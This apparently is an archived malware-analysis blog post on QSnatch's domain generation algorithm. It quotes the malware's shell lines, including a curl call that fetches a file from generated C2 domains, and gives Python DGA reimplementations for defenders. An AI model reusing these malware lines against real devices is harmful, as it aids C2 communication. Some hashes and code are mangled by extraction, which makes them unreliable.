{
    "id": "3985d45d-fc97-47dc-ac17-0e31020f124e",
    "created_at": "2023-01-12T15:01:42.448707Z",
    "updated_at": "2025-03-27T02:05:41.722225Z",
    "deleted_at": null,
    "sha1_hash": "ca5cdf8cc1617bd50ae98060ed86c9a1f0fc5b7c",
    "title": "2019-11-12 - The DGA of QSnatch",
    "authors": "",
    "file_creation_date": "2022-05-27T21:08:31Z",
    "file_modification_date": "2022-05-27T21:08:31Z",
    "file_size": 1375663,
    "plain_text": "# The DGA of QSnatch\n\n**bin.re/blog/the-dga-of-qsnatch/**\n\nQSnatch is a malware that infects QNAP NAS devices. It collects and exfiltrates user credentials from vulnerable devices, and can also load\nmalicious code from its command and control (C2) servers. These C2 servers are resolved by algorithmically generated domains.\n\n[The National Cyber Security Centre of Finland (NCSC-FI) published an article about QSnatch in late October 2019 and made the threat](https://www.kyberturvallisuuskeskus.fi/en/news/qsnatch-malware-designed-qnap-nas-devices)\nknown, but samples on Virustotal date back to at least June 2019.\n\nI found seven different QSnatch samples with two different DGAs. Both versions are very similar, with one being a simpler version of the other.\nI called the more complicated version Version A and the simpler one Version B. QSnatch is implemented as shell scripts so it is trivial to\nreimplement the DGA in Python.\n\n## Version A\n\nThese are two samples with the more complicted version of the DGA from Virustotal. This version of QSnatch comes with a timestamp as\nversion information:\n\n**MD5**\n372140d7c2c68dc2c8dc137d1a471e9f\n\n**SHA1**\n986f38a04937ede2000e8f25e59ea438ee265e24\n\n**SHA256**\n3c38e7bb004b000bd90ad94446437096f46140292a138bfc9f7e44dc136bac8d\n\n**Version Timestamp**\n2019-03-20 5:00 UTC\n\n**Size**\n41KB, 41655 Bytes\n\n**Uploaded to Virustotal**\n2019-11-04 13:39:51 UTC\n\nand this sample (which is also the one currently delivered as of 2019-11-14 11:00 UTC):\n\n**MD5**\n60567a1d2b2e02e93ffc162e6a70d60c\n\n**SHA1**\n\n\n-----\n\nb 0bd d 890 9d5 6 30 0 ab5aa 33c3ae\n\n**SHA256**\n9526ccdeb9bf7cfd9b34d290bdb49ab6a6acefc17bff0e85d9ebb46cca8b9dc2\n\n**Version Timestamp**\n2019-05-17 5:00 UTC\n\n**Size**\n41KB, 41104 Bytes\n\n**Uploaded to Virustotal**\n2019-06-09 22:56:07 UTC\n\nBoth samples have a timestamp set to exactly 05:00 UTC, which could mean that the timestamp is in fact a simple date without time\ninformation, generated in a timezone UTC+5.\n\nThe DGA generates domains like the following:\n```\nt2q2r.cf\ngc9nz.tk\n07tvvc.com\n7ubqo.ml\n53bcm.de\n6zltf.rocks\nhv7uv.mx\nnypno.biz\nqkzccy.net\nrassb.cn\n\n### Bash\n\n```\nThe following screenshots shows the shell script lines responsible for generating the domains:\n\n\n-----\n\nIn the following I will briefly discuss the main components of the DGA.\n\n**TLDs**\n\nThe complicated version of the DGA of QSnatch uses a whopping 145 top level domain, including many gTLDS like `rocks,` `mobi,` `today ;`\nand a few sld/tld-tuples where domain registrations are only possible on the third level, like `.com.ua,` `.com.bn,` `.com.by . The domains are`\nlisted in a space separated string as tld/number-pairs divided by colons:\n```\ndomainexts='cf:0 tk:0 com:1 ml:0 de:0 rocks:0 mx:0 biz:0 ...``\n\n```\nThe number next to the domain specifies the number of extra characters in the hostname. In the analysed sample, `.com,` `.net and` `.org`\nhave 1 extra character specified, meaning their hostname has one extra character compared the remaining tlds, which all have 0 extra\ncharacters set.\n\nThe script has a bug for the domain `.com.bn which is listed with a leading dot, resulting in invalid domains with doubled points, e.g.,`\n```\nr4rb..com.bn .\n\n```\n**Domain Timespans**\n\nThe generated domains have different validities of 15 days (1296000 seconds) down to 1 hour (3600 seconds). The DGA generates domains\nfor all specified intervals starting with the largest timespan.\n\n\n-----\n\n**Hostname Lengths**\n\nThe hostnames have varying lengths, which are calculated by adding a global length value and the number next to the list of top level\ndomains. The global lengths are 5, 3, then 4. As a result, `.cf hostnames have a length of 3 to 5, while` `.com hostnames have a length of 4`\nto 6.\n```\nfor length in 5 3 4; do\n\n```\n**Iterating over all TLDs**\n\nThe third loop iterates over all top level domains.\n```\nn=0; while [ \"$n\" -lt $domainextcnt ]; do\n\n```\nTime permitting, the DGA generates 6 (number of timespans) * 3 (number of hostname lengths) * 145 (number of tlds) = 2610 domains.\n\n**Aborting Domain Generation**\n\nBefore looping over the top level domains, the DGA checks if more than 10 minutes (600 seconds) passed since starting a timespan block. If\nten minutes elapsed, then generating domains for that particular timespan is aborted, unless it is the last timespan:\n```\ntest \"$(( $timenow - $timestart ))\" -gt 600 && test \"$interval\" != \"3600\" && break\n\n```\n**Hostname String Generation**\n\nThe following command generates the string which is later trimmed into a hostname:\n```\nhostname=$(echo \\\n \"$(( $(date +%s) / $interval ))IbjGOEgnuD${ext}\" | \\\n openssl dgst -sha1 -binary | \\\n openssl base64 | \\\n sed 'y/ABCDEFGHIJKLMNOPQRSTUVWXYZ-+\\//abcdefghijklmnopqrstuvwxyzabc/;s/=//g')\n\n```\n1. The command `($(date +%s) / $interval ) divides the current unix timestamp by the timespan length.`\n2. The seed `IbjGOEgnuD and the top level domain` `${ext} are appended to the string from Step 1.`\n3. `openssl dgst -sha1 -binary generates the SHA1-hash of the string (including a newline character` `\\n from the echo command).`\n4. `openssl base64 converts the hash into base64.`\n5. `sed 'y/.../;s/=//g') converts the base64 string into lowercase, replaces` `-,` `+ and` `\\\\ with` `a,` `b and` `c respectively, and`\n\nremoves `= -padding.`\n\n**Trimming to desired length**\n\nNext, the hostname is trimmed to the desired length. The length can not be smaller than 3, which is never the case for the configured lengths:\n```\ntrycnt=0\nwhile [ ${#host} -gt \"$l\" ] && [ $trycnt -lt 3 ]; do\n trycnt=$(( $trycnt + 1 ))\n host=${host%?}\ndone\n\n```\n**Concatenating the Hostname and SLD**\n\nFinally, the hostname and tld are joined to produce the DGA domain:\n```\ncurl --connect-timeout \"$curlconntimeout\" -m 30 -k -o \"$outfile\" \"https://${host}.${ext}/qnap_firmware.xml?t=$(date +%s)\"\n\n### Python\n\n```\nThis is a reimplementation of Version A of the DGA in Python 3:\n\n\n-----\n\n```\nimport hashlib\nimport base64\nimport argparse\nfrom datetime import datetime\nTLDS = {\n  \"cf\": 0, \"tk\": 0, \"com\": 1, \"ml\": 0, \"de\": 0, \"rocks\": 0, \"mx\": 0,\n  \"biz\": 0, \"net\": 1, \"cn\": 0, \"ga\": 0, \"gq\": 0, \"org\": 1, \"top\": 0, \"nl\": 0,\n  \"men\": 0, \"ws\": 0, \"se\": 0, \"info\": 0, \"xyz\": 0, \"today\": 0, \"ru\": 0,\n  \"ec\": 0, \"co\": 0, \"ee\": 0, \"rs\": 0, \"com.sv\": 0, \"com.cy\": 0, \"co.zw\": 0,\n  \"kg\": 0, \"com.ge\": 0, \"tl\": 0, \"name\": 0, \"tw\": 0, \"lv\": 0, \"bs\": 0,\n  \"li\": 0, \"ng\": 0, \"ae\": 0, \"bt\": 0, \"tv\": 0, \"pe\": 0, \"uz\": 0, \"me\": 0,\n  \"gy\": 0, \"am\": 0, \"kr\": 0, \"by\": 0, \"fr\": 0, \"com.uy\": 0, \"com.lb\": 0,\n  \"com.br\": 0, \"vu\": 0, \"hk\": 0, \"in\": 0, \"re\": 0, \"ch\": 0, \"af\": 0,\n  \"com.ps\": 0, \"ug\": 0, \"dz\": 0, \"pro\": 0, \"co.th\": 0, \"sg\": 0, \"cd\": 0,\n  \"so\": 0, \"mo\": 0, \"co.id\": 0, \"co.il\": 0, \"com.do\": 0, \"ke\": 0, \"cx\": 0,\n  \"ro\": 0, \"id\": 0, \"pm\": 0, \"hm\": 0, \"vg\": 0, \"az\": 0, \"com.eg\": 0, \"bz\": 0,\n  \"su\": 0, \"com.ar\": 0, \"gg\": 0, \"com.lr\": 0, \"pa\": 0, \"com.ve\": 0, \"al\": 0,\n  \"fm\": 0, \"to\": 0, \"mu\": 0, \"co.ck\": 0, \"pk\": 0, \"co.rs\": 0, \"cw\": 0,\n  \"nr\": 0, \"gd\": 0, \"gl\": 0, \"ac\": 0, \"lk\": 0, \"md\": 0, \"fi\": 0, \"sx\": 0,\n  \"lc\": 0, \"es\": 0, \"cc\": 0, \"cm\": 0, \"la\": 0, \"co.za\": 0, \"je\": 0, \"cz\": 0,\n  \"jp\": 0, \"ai\": 0, \"pw\": 0, \"bg\": 0, \"nu\": 0, \"ag\": 0, \"bm\": 0, \"eu\": 0,\n  \"com.my\": 0, \"sc\": 0, \"ax\": 0, \"wf\": 0, \"ly\": 0, \"qa\": 0, \"vn\": 0, \"aq\": 0,\n  \"mobi\": 0, \"com.tr\": 0, \"com.ua\": 0, \"com.py\": 0, \"hk.org\": 0,\n  \"south.am\": 0, \"com.kh\": 0, \"co.zm\": 0, \"ru.net\": 0, \"com.km\": 0, \"tt\": 0,\n  \"kn\": 0, \"co.ls\": 0, \"co.fk\": 0, \"uy.com\": 0, \"com.gu\": 0, \".com.bn\": 0,\n  \"com.pf\": 0, \"com.fj\": 0\n}\nSEED = \"IbjGOEgnuD\"\ndef dga(date):\n  def unix(date):\n    unix = int(time.mktime(date.timetuple()))\n    return unix\n  HOUR = 3600\n  DAY = 24*HOUR\n  for interval in [15*DAY, 5*DAY, 1*DAY, 8*HOUR, 2*HOUR, 1*HOUR]:\n    for length in [5, 3, 4]:\n      for tld, l in TLDS.items():\n        min_length = l + length\n        key = f\"{unix(date)//interval}{SEED}{tld}\\n\".encode('ascii')\n        key_hash = hashlib.sha1(key).digest()\n        key_hash_b64 = base64.b64encode(key_hash).decode('ascii')\n        key_hash_b64_noeq_lc = key_hash_b64.rstrip(\"=\").lower()\n        trantab = str.maketrans(\"-+/\", \"abc\")\n        hostname_src = key_hash_b64_noeq_lc.translate(trantab)\n        hostname_len = max(min_length, 3)\n        hostname = hostname_src[:hostname_len]\n        domain = f\"{hostname}.{tld}\"\n        yield domain\nif __name__ == \"__main__\":\n  parser = argparse.ArgumentParser(description=\"QSnatch dga\")\n  parser.add_argument(\n    \"-d\", \"--datetime\",\n    help=\"date time for which to generate domains, e.g., \"\n       \"2019-11-11 18:00:00\")\n  args = parser.parse_args()\n  if args.datetime:\n    d = datetime.strptime(args.datetime, \"%Y-%m-%d %H:%M:%S\")\n  else:\n    d = datetime.now()\n  for domain in dga(d):\n    print(domain)\n\n## Version B\n\n```\nVersion B of the DGA is simpler than the previously described version. I found these five samples on Virustotal that use the simpler version of\nthe DGA:\n\n**MD5** **SHA1** **SHA256**\n\n\n-----\n\n**MD5** **SHA1** **SHA256**\n\n8cee2a187198648c199c1d135c918a3a a9f39f3b832344a79d32d92ac56c50cdaff0b93c 09ab3031796bea1b8b79fcfd2b86dac8f38b1f95f0fce\n\nc49ac8cfe022ff6acb8eb0036e2fc1a1 e30ce38ff0ce46d8256d06fb3d5e13bf3abb1012 5cb5dce0a1e03fc4d3ffc831e4a356bce80e928423b3\n\n4affa116b27f2d977a756e353f77b8f5 e8bb081056542504b5a69bd5f202cf77fac0a64f 8fd16e639f99cdaa7a2b730fc9af34a203c41fb353eaa\n\n421f006756f72cabc1ffb796c6cdb5c0 5ca92d6f02019519de593758583d7ca5a4bf9f23 5130282cdb4e371b5b9257e6c992fb7c11243b2511a\n\n421240952a097e904df778590caa9668 58523de660632c6b84ffbd243cc75f4fb576980a 15892206207fdef1a60af17684ea18bcaa5434a1c7bd\n\nExamples of domains of this DGA are:\n```\nt2q2rs.cf\nt2q2rsa.cf\nt2q2rsaz.cf\nt2q2rsazo.cf\nt2q2rsazo1.cf\ngc9nzf.tk\ngc9nzfb.tk\ngc9nzfbt.tk\ngc9nzfbt3.tk\ngc9nzfbt3i.tk\n\n### Bash\n\n```\nThese are the lines of QSnatch that generate the domains:\n\nThe DGA uses fewer tlds, without tld-specific hostname length specifiers. The algorithm only uses one timespan (15 days). It uses more\nhostname lengths (6, 7, 8, 9 and 10) which are generated one after another for a specific hostname pattern.\n\nThe generation of the string for the hostname is the same as for the more complicated DGA version, including the seed `IbjGOEgnuD .`\nBecause Version A mostly uses hostname lengths of 5 and shorter, while Version B uses lengths of 6 up to 10, only some domains from\nVersion A with an extra character overlap with Version B ( .com, `.net,` `.org ). For example,` `07tvvc.com is a valid domain for both`\n\n\n-----\n\nG s\n\n### Python\n```\nimport time\nimport hashlib\nimport base64\nimport argparse\nfrom datetime import datetime\nTLDS =[\n  'cf', 'tk', 'ml', 'ga', 'gq', 'com', 'biz', 'org', 'de', 'rocks', \n  'mx', 'cn', 'top', 'nl', 'men', 'ws', 'se', 'info', 'xyz', 'net', 'today', \n  'ru', 'fi', 'name', 'to', 'in', 'com.ua', 'vg', 'vn', 'cd'\n]\nSEED = \"IbjGOEgnuD\"\ndef dga(date):\n  def unix(date):\n    unix = int(time.mktime(date.timetuple()))\n    return unix\n  HOUR = 3600\n  DAY = 24*HOUR\n  INTERVAL = 15*DAY\n  for tld in TLDS:\n    key = f\"{unix(date)//INTERVAL}{SEED}{tld}\\n\".encode('ascii')\n    key_hash = hashlib.sha1(key).digest()\n    key_hash_b64 = base64.b64encode(key_hash).decode('ascii')\n    key_hash_b64_noeq_lc = key_hash_b64.rstrip(\"=\").lower()\n    trantab = str.maketrans(\"-+/\", \"abc\")\n    hostname_src = key_hash_b64_noeq_lc.translate(trantab)\n    for hostname_len in range(6, 11):\n      hostname = hostname_src[:hostname_len]\n      domain = f\"{hostname}.{tld}\"\n      yield domain\nif __name__ == \"__main__\":\n  parser = argparse.ArgumentParser(description=\"QSnatch DGA Version 1\")\n  parser.add_argument(\n    \"-d\", \"--datetime\",\n    help=\"date time for which to generate domains, e.g., \"\n       \"2019-11-11 18:00:00\")\n  args = parser.parse_args()\n  if args.datetime:\n    d = datetime.strptime(args.datetime, \"%Y-%m-%d %H:%M:%S\")\n  else:\n    d = datetime.now()\n  for domain in dga(d):\n    print(domain)\n\n```\n[You also find both versions of the QSnatch DGA in my collection of domain generation algorithms on GitHub.](https://github.com/baderj/domain_generation_algorithms/tree/master/qsnatch)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-11-12 - The DGA of QSnatch.pdf"
    ],
    "report_names": [
        "2019-11-12 - The DGA of QSnatch.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535702,
    "ts_updated_at": 1743041141,
    "ts_creation_date": 1653685711,
    "ts_modification_date": 1653685711,
    "files": {
        "pdf": "https://archive.orkl.eu/ca5cdf8cc1617bd50ae98060ed86c9a1f0fc5b7c.pdf",
        "text": "https://archive.orkl.eu/ca5cdf8cc1617bd50ae98060ed86c9a1f0fc5b7c.txt",
        "img": "https://archive.orkl.eu/ca5cdf8cc1617bd50ae98060ed86c9a1f0fc5b7c.jpg"
    }
}